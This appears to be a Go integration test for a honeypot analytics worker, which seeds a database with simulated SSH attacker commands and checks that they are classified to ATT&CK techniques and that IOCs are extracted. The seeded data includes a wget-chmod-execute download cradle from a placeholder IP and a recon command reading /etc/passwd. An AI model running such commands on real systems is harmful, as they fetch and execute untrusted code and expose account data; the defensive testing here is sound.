package intelligence

import (
	"context"
	"os"
	"strconv"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/config"
	"github.com/qpot/qpot/internal/database"
)

// TestWorkerClassifiesAgainstClickHouse is a full-stack worker test: a real
// ClickHouse-backed Worker reads unclassified events, classifies them to ATT&CK
// techniques, persists the tags, extracts IOCs, and the results are queryable
// back from the database. Gated on QPOT_TEST_CLICKHOUSE=1 so the unit suite
// stays hermetic.
func TestWorkerClassifiesAgainstClickHouse(t *testing.T) {
	if os.Getenv("QPOT_TEST_CLICKHOUSE") != "1" {
		t.Skip("set QPOT_TEST_CLICKHOUSE=1 to run the full-stack ClickHouse worker test")
	}

	cfg := config.Default("worker-integration").Database
	cfg.Type = "clickhouse"
	if h := os.Getenv("QPOT_TEST_CH_HOST"); h != "" {
		cfg.Host = h
	} else {
		cfg.Host = "127.0.0.1"
	}
	if p := os.Getenv("QPOT_TEST_CH_PORT"); p != "" {
		cfg.Port, _ = strconv.Atoi(p)
	}
	if v := os.Getenv("QPOT_TEST_CH_USER"); v != "" {
		cfg.Username = v
	}
	if v := os.Getenv("QPOT_TEST_CH_PASS"); v != "" {
		cfg.Password = v
	}
	if v := os.Getenv("QPOT_TEST_CH_DB"); v != "" {
		cfg.Database = v
	}

	db, err := database.New(&cfg)
	if err != nil {
		t.Fatalf("database.New: %v", err)
	}
	ctx := context.Background()
	if err := db.Connect(ctx); err != nil {
		t.Fatalf("connect: %v", err)
	}
	defer db.Close()
	if err := db.InitializeSchema(ctx); err != nil {
		t.Fatalf("schema: %v", err)
	}

	// Insert events that classify to known ATT&CK techniques and carry IOCs:
	// a remote-payload fetch (download cradle) and a recon command.
	evs := []*database.Event{
		{Timestamp: time.Now().UTC(), Honeypot: "cowrie", SourceIP: "198.51.100.23", DestPort: 22, Protocol: "ssh",
			EventType: "command", Command: "wget http://203.0.113.9/x.sh -O /tmp/x.sh; chmod +x /tmp/x.sh; ./x.sh"},
		{Timestamp: time.Now().UTC(), Honeypot: "cowrie", SourceIP: "198.51.100.24", DestPort: 22, Protocol: "ssh",
			EventType: "command", Command: "uname -a; cat /etc/passwd"},
	}
	if err := db.InsertEvents(ctx, evs); err != nil {
		t.Fatalf("InsertEvents: %v", err)
	}
	time.Sleep(500 * time.Millisecond) // let the async insert settle

	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	classifier := NewClassifier(loader, NewTTPBuilder(30*time.Minute))
	w := NewWorker(classifier, db, time.Minute, 500)

	classified := w.runOnce(ctx)
	if classified == 0 {
		t.Fatal("worker classified 0 events against ClickHouse (expected the seeded batch)")
	}
	t.Logf("worker classified %d events", classified)

	// The download cradle should yield IOCs (the URL and/or the IP). Verify at
	// least one IOC is now queryable back from ClickHouse.
	time.Sleep(700 * time.Millisecond)
	iocs, err := db.GetIOCs(ctx, database.IOCFilter{Limit: 100})
	if err != nil {
		t.Fatalf("GetIOCs: %v", err)
	}
	if len(iocs) == 0 {
		t.Error("no IOCs persisted after worker run (expected URL/IP from the download cradle)")
	}
	for _, i := range iocs {
		t.Logf("IOC: type=%s value=%q technique=%s", i.Type, i.Value, i.TechniqueID)
	}
}
